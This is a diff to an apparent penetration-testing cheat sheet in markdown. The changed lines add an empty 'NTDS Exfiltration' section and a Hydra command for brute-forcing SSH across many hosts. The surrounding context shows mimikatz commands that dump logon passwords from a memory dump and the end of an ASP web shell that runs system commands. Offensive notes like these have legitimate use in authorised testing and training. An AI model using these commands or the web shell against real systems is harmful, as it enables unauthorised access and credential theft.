@@ -62,6 +62,10 @@ sekurlsa::minidump “XXXXXXXXX.DMP”
 sekurlsa::logonPasswords
 ```
 
+### NTDS Exfiltration
+
+TODO
+
 ### PowerShell one-liners
 
 Bloodhound : Using ingestors to collect the data and then send it to BloodHound.
@@ -114,4 +118,13 @@ o = cmd.StdOut.Readall()
 Response.write(o)
 Response.write("</pre>")
 %>
+```
+
+## Bruteforce
+
+### SSH
+
+Use Hydra :
+```markdown
+hydra -l USERNAME -P FILE_CONTAINING_PASSWORDS -M FILE_CONTAINING_IP_TO_BRUTEFORCE -t 4 ssh
 ```
